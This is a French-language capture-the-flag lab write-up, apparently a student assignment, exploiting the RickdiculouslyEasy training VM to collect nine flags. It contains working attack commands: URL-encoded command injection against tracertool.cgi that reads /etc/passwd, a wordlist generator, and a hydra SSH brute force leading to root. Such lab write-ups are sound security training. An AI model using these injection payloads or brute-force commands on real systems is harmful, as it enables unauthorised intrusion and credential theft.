
# Rendu sur la machine RickdiculouslyEasy

## Introduction

Ce document détaille l'exploitation de la machine **RickdiculouslyEasy**. En tant que première machine de ce module, elle a pour objectif de nous initier aux CTFs et aux différentes étapes nécessaires pour exploiter une machine.  

Toutes les observations, ainsi que les commandes exécutées, seront présentées sous forme de blocs de code dans ce document. Cela est dû à l'impossibilité de réaliser des captures d'écran au moment de cette activité.  

Selon l'enseignant, cette machine est davantage un tutoriel qu'un travail sérieux, bien que nous ayons réussi à trouver le flag bonus. Ainsi, l'absence d'illustrations dans ce rendu n'est pas particulièrement problématique.  

Les prochains rendus, quant à eux, comporteront pour la plupart des illustrations afin de mieux documenter les démarches et observations.  

---



## Étape 1: Découverte du réseau
On arrive sur le réseau à infiltrer, on commence par scanner le réseau pour trouver les machines connectées.

```bash
$ sudo netdiscover
```

```
Currently scanning: 192.168.228.0/24   |   Screen View: Unique Hosts

4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 240
_____________________________________________________________________________
    IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.228.161 00:0c:29:36:8b:ec      2     120  VMware, Inc.
```
On a trouvé notre cible, la machine `192.168.228.161` 

## Étape 2: Scan des ports
On va scanner les ports de la machine cible pour trouver les services qui tournent.
```bash
$ sudo nmap -sS 192.168.228.161 -p-
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 14:00 CET
Nmap scan report for 192.168.228.161
Host is up (0.0024s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
9090/tcp  open  zeus-admin
13337/tcp open  unknown
22222/tcp open  easyengine
60000/tcp open  unknown
MAC Address: 00:0C:29:36:8B:EC (VMware)
```
L'utilisation de `-p-` permet de scanner tous les ports et pas seulement les ports les plus connus. 



# Déroulement du CTF
---

### Premier Flag - FTP anonyme (port 21)
    
On remarque que le port 21 est ouvert, généralement, c'est le port du service FTP. On va essayer de se connecter en anonyme pour voir si on peut accéder à des fichiers.

```bash
$ ftp -a 192.168.228.161
Connected to 192.168.228.161.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49108|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
229 Entering Extended Passive Mode (|||62134|)
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
100% |*************************************************************************************************************************|    42        1.17 MiB/s    00:00 ETA
226 Transfer complete.
42 bytes received in 00:00 (26.68 KiB/s)
ftp> quit

$  echo "$ (<FLAG.txt)"
FLAG{Whoa this is unexpected} - 10 Points
```
`FLAG{Whoa this is unexpected} - 10 Points`

---

### Fausse piste - ssh (port 22)

On trouve un service SSH sur le port 22, on va essayer de se connecter avec les identifiants par défaut.

```bash
$ ssh root@192.168.228.161
Connection closed by 192.168.228.161 port 22
```

La connexion a été fermée, on peut supposer que c'est pas vraiment un service SSH. On va essayer de `curl` le port 22 pour voir le genre de réponses qu'on reçoit.

```bash
$ curl --http0.9 192.168.228.161:22
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
```

On reçoit une réponse qui nous indique que c'est pas vraiment un service SSH. Mais plus un service HTTP ? Ou un simple message netcat ?
Peut-être pour nous induire en erreur sur le système d'exploitation de la machine ?


---



### Deuxième Flag - zeus-admin (port 9090)

On va essayer de se connecter au service zeus-admin sur le port 9090.

On retrouve une interface web, sur laquelle on retrouve le flag 

`FLAG {There is no Zeus, in your face!} - 10 Points`


---


### Troisième Flag - Connexion au port 13337

On va essayer de se connecter au port 13337 pour voir ce qu'il y a derrière.

```bash
$ nc 192.168.228.161 13337
FLAG:{TheyFoundMyBackDoorMorty}-10Points
```
`FLAG:{TheyFoundMyBackDoorMorty}-10Points`

---


### Quatrième Flag - Reverse Shell (port 60000)

On retrouve un service sur le port 60000, on va essayer de se connecter avec netcat pour voir ce qu'il y a derrière.

```bash
$ nc 192.168.228.161 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt
# whoami
root
# mkdir
mkdir: command not found
# cat
cat: no such file or directory
# cd ..
Permission Denied.
# touch test
touch test: command not found
# pwd
/root/blackhole/
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
```

On y retrouve un reverse shell, avec un flag `FLAG{Flip the pickle Morty!} - 10 Points`. Malheureusement, les commandes sont limitées, on ne peut pas faire grand-chose avec ce shell. Certaines commandes émulées sont intéressantes, notamment `whoami` qui nous indique que nous sommes `root` et `pwd` qui nous indique que nous sommes dans le dossier `/root/blackhole/`. 

Aucune autre commande n'est disponible, on ne peut pas naviguer dans les dossiers ou créer des fichiers.


---


### Découverte Interessante - Service SSH (port 22222)

Le port 22222 est ouvert, on va essayer de se connecter avec netcat pour voir ce qu'il y a derrière.

```bash
$ nc 192.168.228.161 22222
SSH-2.0-OpenSSH_7.5
```

On a possiblement une réponse d'un service SSH, on va essayer de se connecter avec un client SSH pour s'assurer que c'est bien un service SSH.

```bash
$ ssh root@192.168.228.161 -p 22222
The authenticity of host '[192.168.228.161]:22222 ([192.168.228.161]:22222)' can't be established.
ED25519 key fingerprint is SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.228.161]:22222' (ED25519) to the list of known hosts.
root@192.168.228.161's password:
```

On dirait que c'est bien un service SSH, on a pas encore les identifiants pour se connecter, on va essayer de les trouver ailleurs.



---



### Cinquième Flag - Page web (port 80)

On se retrouve sur une page html, on peut essayer de trouver les chemins cachés avec nmap.

```bash
$ nmap -sV --script=http-enum 192.168.228.161

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 14:30 CET
Nmap scan report for 192.168.228.161
Host is up (0.00093s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.27 ((Fedora))
|_http-server-header: Apache/2.4.27 (Fedora)
| http-enum:
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /passwords/: Potentially interesting folder w/ directory listing
```

On retrouve un fichier robots.txt et un dossier passwords, en les visitant, on trouve un flag et un fichier `passwords.html`.

```bash
$ curl http://192.168.228.161/passwords/FLAG.txt
FLAG{Yeah d- just don't do it.} - 10 Points
```

```bash	
$ curl http://192.168.228.161/passwords/passwords.html

<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```

Intéressant, dans les commentaires, on retrouve un mot de passe `winter`, connaissant le monde de Rick et Morty, on peut poser une hypothèse sur la corrélation avec la sœur de Morty, Summer...


Dans le fichier robots.txt on retrouve des fichiers cachés, on peut essayer de les visiter pour voir ce qu'ils font.

```bash
$  curl http://192.168.228.161/robots.txt
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

On retrouve des fichiers cgi, on peut essayer de les visiter pour voir ce qu'ils font.

`root_shell.cgi` est un script vide qui ne fait rien, par contre `tracertool.cgi` est un script qui permet de tracer une route vers une adresse IP. On peut essayer de faire une injection de commande pour voir.


```bash
$ curl "http://192.168.228.161/cgi-bin/tracertool.cgi?ip=localhost%3B+ls"

<html><head><title>Super Cool Webpage
</title></head>
<b>MORTY'S MACHINE TRACER MACHINE</b>
<br>Enter an IP address to trace.</br>
<form action=/cgi-bin/tracertool.cgi
    method="GET">
<textarea name="ip" cols=40 rows=4>
</textarea>
<input type="submit" value="Trace!">
</form>
<pre>
traceroute to localhost (127.0.0.1), 30 hops max, 60 byte packets
 1  localhost (127.0.0.1)  0.012 ms  0.002 ms  0.002 ms
root_shell.cgi
tracertool.cgi
</pre>
</html>
```
On a réussi à injecter la commande `ls`, on connaît donc le contenu du dossier, ce qui nous permet de vérifier les fichiers `root_shell.cgi` et `tracertool.cgi`.
Comme dit précédemment `root_shell.cgi` est vide, mais `tracertool.cgi` est un script qui appelle une commande shell, ce qui rend possible l'injection de commande.
Pas de flag ici, mais on peut en profiter pour essayer de trouver les utilisateurs de la machine en lisant le fichier `/etc/passwd`.

```bash
$ curl "http://192.168.228.161/cgi-bin/tracertool.cgi?ip=localhost%3B+less+%2Fetc%2Fpasswd"

<html><head><title>Super Cool Webpage
</title></head>
<b>MORTY'S MACHINE TRACER MACHINE</b>
<br>Enter an IP address to trace.</br>
<form action=/cgi-bin/tracertool.cgi
    method="GET">
<textarea name="ip" cols=40 rows=4>
</textarea>
<input type="submit" value="Trace!">
</form>
<pre>
traceroute to localhost (127.0.0.1), 30 hops max, 60 byte packets
 1  localhost (127.0.0.1)  0.024 ms  0.003 ms  0.002 ms
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
</pre>
</html>
```
On a trouvé les utilisateurs de la machine, certains sont intéressants, par exemple `RickSanchez`, `Morty` et bien sur la sœur de Morty `Summer`.


---



### Sixième  Flag - SSH avec l'utilisateur Summer

Lors du dernier flag, on a trouvé un mot de passe `winter` et un utilisateur `Summer`, on peut essayer de se connecter en SSH avec ces identifiants.

```bash
$ ssh Summer@192.168.228.161 -p 22222

Summer@192.168.228.161's password:
Last login: Fri Nov  8 01:47:34 2024 from 192.168.228.160
[Summer@localhost ~]$  ls
FLAG.txt
[Summer@localhost ~]$  echo "$ (<FLAG.txt)"
FLAG{Get off the high road Summer!} - 10 Points
```
Dans le répertoire de `Summer`, on retrouve un flag `FLAG{Get off the high road Summer!} - 10 Points`.

---


### Septième Flag - Fichiers dans le répertoire de Morty

Maintenant, qu'on est connecté en SSH avec l'utilisateur `Summer`, on peut essayer de naviguer dans le système pour trouver des fichiers intéressants.
Notamment dans le répertoire de `Morty`.


```bash
[Summer@localhost ~]$ cd /home/Morty/
[Summer@localhost Morty]$ ls
journal.txt.zip  Safe_Password.jpg
```
On retrouve un fichier `journal.txt.zip` et une image `Safe_Password.jpg`, on va les récupérer sur notre machine pour les analyser en utilisant `sftp` avec les identifiants de `Summer`.

L'archive `journal.txt.zip` est protégée par un mot de passe, on va essayer de le trouver dans l'image `Safe_Password.jpg`.
Pour ça, on va utiliser `aperisolve`, un site web qui permet d'extraire des informations d'une image.
On y retrouve des informations :

| DECIMAL | HEXADECIMAL | DESCRIPTION                                                |
|---------|-------------|------------------------------------------------------------|
| 0       | 0x0         | JPEG image data, JFIF standard 1.01                        |
| 30      | 0x1E        | TIFF image data, big-endian, offset of first image directory: 8 |
| 192     | 0xC0        | Unix path: /home/Morty/journal.txt.zip. Password: Meeseek  |

On y retrouve le mot de passe `Meeseek` (monsieur larbin dans la version française), on va l'utiliser pour extraire le contenu de l'archive.

```bash
$ unzip journal.txt.zip
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: {Meeseek}
  inflating: journal.txt

$ cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points
```

On a trouvé un autre flag `FLAG: {131333} - 20 Points`. 
Mais le message est intéressant, on peut supposer qu'il y a un coffre-fort quelque part, on va essayer de le trouver pour voir.
De plus, comparé aux autres flags, celui-ci est une suite de chiffres, et non une citation de la série, on peut supposer qu'il est plus important que les autres.


---


### Huitième Flag - Coffre fort de Rick

On continuant de naviguer dans le système, on arrive dans le répertoire de `RickSanchez`.
    
```bash
[Summer@localhost ~]$ cd /home/RickSanchez/
[Summer@localhost RickSanchez]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
````
Ignorons le fichier `ThisDoesntContainAnyFlags` et concentrons nous sur le dossier `RICKS_SAFE`.

```bash
[Summer@localhost RickSanchez]$ cd RICKS_SAFE/
[Summer@localhost RICKS_SAFE]$ ls
safe
```

Le fichier `safe` est un fichier binaire, essayons de l'exécuter pour voir ce qu'il fait.

```bash
[Summer@localhost RICKS_SAFE]$ ./safe
-bash: ./safe: Permission denied
[Summer@localhost RICKS_SAFE]$ ls -al safe
-rwxr--r--. 1 RickSanchez RickSanchez 8704 Sep 21  2017 safe
```

Évidement, on a pas les permissions pour exécuter le fichier, on va essayer de le copier avec sftp sur notre machine pour l'analyser.

```bash
$ ./safe
./safe: error while loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory
```
C'est peut-être plus judicieux de ne pas exécuter des fichiers inconnus sur notre machine, mais bon.... Trop tard!
Le programme a besoin de la librairie `libmcrypt.so.4` pour fonctionner, essayons plutôt de l'exécuter sur la machine cible en le copiant dans un répertoire de Summer

```bash
[Summer@localhost RICKS_SAFE]$ cp safe /home/Summer/
[Summer@localhost RICKS_SAFE]$ cd /home/Summer/
[Summer@localhost Summer]$ ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
[Summer@localhost ~]$ ./safe help
decrypt:                             嬗�N�~`fɋ�}}��'zA�j(��Z���~��I
                                                                   �I9}'�u�/��avVGP%��GG�̩�18�%}��s���O��I�#-��(`�G�JF�T���τ!-�g4�NP��R�p�0�J1_�Xw��w/>�Y ��%�����,D����74�3�JB       @�tN!���,ثC�
��`ޘ�n                      kk�}V`      �T�Q���
!uFO��x��ã�mԅ��"��i��po����D��_���;q륿��Ԇ�r�6_C���~{�y�
```

Le programme a besoin d'arguments pour fonctionner, on sait que le programme utilise la librairie `libmcrypt.so.4`, donc on peut supposer que c'est un programme de cryptage/décryptage surtout vu le nom du programme `safe`. Il nous faut donc trouver la clé de décryptage pour pouvoir lire le contenu du fichier.

Par hasard, utilisons la suite de chiffres trouvée dans le journal de Morty `131333` comme clé de décryptage.

```bash
[Summer@localhost ~]$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.� @
```

On a trouvé un autre flag `FLAG{And Awwwaaaaayyyy we Go!} - 20 Points` et un message de Rick.


---



### Neuvième Flag - Accès Root

La sortie du programme `./safe` nous donne des indices sur son mot de passe.
Les critères sont simples : 1 caractère en majuscule, 1 chiffre et un mot de l'ancien nom de son groupe de musique.
Après quelques recherches, on trouve que le groupe de Rick s'appelle `The Flesh Curtains`.

Donc, dans la logique, le mot de passe serait sous la forme `H1Flesh`, il nous reste plus qu'à faire un script pour générer les mots de passe possibles et les tester.

```python
import string,os
def generate_password():
    for letter in string.ascii_uppercase:
        for digit in string.digits:
            for word in ["the", "Flesh", "Curtains"]:
                yield f"{letter}{digit}{word}"


for password in generate_password():
    os.system(f"echo {password}>> passwords.txt")
    print(password)
```

On va ensuite utiliser le fichier `passwords.txt` pour bruteforcer le mot de passe de Rick.

```bash
$ hydra -l RickSanchez -P ./passwords.txt ssh://192.168.228.161:22222

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-07 18:35:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries (l:1/p:780), ~49 tries per task
[DATA] attacking ssh://192.168.228.161:22222/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 637 to do in 00:05h, 13 active
[STATUS] 108.67 tries/min, 326 tries in 00:03h, 457 to do in 00:05h, 13 active
[22222][ssh] host: 192.168.228.161   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-07 18:40:12
```

On a trouvé le mot de passe de Rick `P7Curtains`, on peut maintenant se connecter en SSH avec Rick pour trouver le dernier flag.



```bash
$ ssh RickSanchez@192.168.228.161 -p 22222
RickSanchez@192.168.228.161's password:

Last failed login: Fri Nov  8 03:40:05 AEDT 2024 from 192.168.228.160 on ssh:notty
There were 839 failed login attempts since the last successful login.
Last login: Fri Nov  8 02:24:11 2024 from 192.168.228.160
[RickSanchez@localhost ~]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
```
On retrouve les mêmes fichiers vus précédemment, dans la sortie du programme `safe` on a eu des indices sur l'utilisation de sudo, ce qui peut nous laisser penser que Rick a les permissions pour exécuter des commandes en tant que root.
    
```bash
[RickSanchez@localhost ~]$ sudo su -
[sudo] password for RickSanchez:
[root@localhost ~]#ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# echo "$(<FLAG.txt)"
FLAG: {Ionic Defibrillator} - 30 points
````

On a trouvé le dernier flag `FLAG: {Ionic Defibrillator} - 30 points` et on a fini le CTF. 


---



# FLAGS
Num| Flag | Points | Origine | Description |
---|------|--------|---------|-------------|
1 | `Whoa this is unexpected` | 10 | FTP | FTP a accès anonyme |
2 | `There is no Zeus, in your face!` | 10 | 9090 | Service web accessible |
3 | `TheyFoundMyBackDoorMorty` | 10 | 13337 | Service accessible |
4 | `Flip the pickle Morty!` | 10 | 60000 | Reverse shell | 
5 | `Get off the high road Summer!` | 10 | SSH | Accès SSH avec Summer |
6 | `Yeah d- just don't do it.` | 10 | /passwords/FLAG.txt | Page html |
7 | `131333` | 20 | /home/Morty | Déchiffrement du journal de Morty |
8 | `And Awwwaaaaayyyy we Go!` | 20 | /home/RickSanchez/RICKS_SAFE | Déchiffrement du coffre fort de Rick |
9 | `Ionic Defibrillator` | 30 | /root | Accès root |

Total: `130` Points

---


# Remarques de fin
## Nmap
J'ai réalisé un peu tard l'importance de l'option nmap `-sV` pour scanner directement les services. Heureusement, je n'ai pas perdu trop de temps à le faire manuellement avec netcat, mais nmap propose cette fonctionnalité directement.
```bash
$ nmap 192.168.228.161 -p21,22,80,9090,13337,22222,60000 -sV

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
22/tcp    open  tcpwrapped
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http       Cockpit web service
13337/tcp open  tcpwrapped
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
60000/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Texte dans les images

Pour l'image `Safe_Password.jpg`, j'ai commencé par utiliser la commande `strings` pour extraire des informations textuelles et, bien que le mot de passe y figurait, je ne l'avais simplement pas remarqué. J'ai ensuite utilisé le site aperisolve, ce qui n'était pas vraiment nécessaire, mais intéressant pour l'avenir, car ce site permet aussi d'analyser les images pour détecter du texte caché par stéganographie.











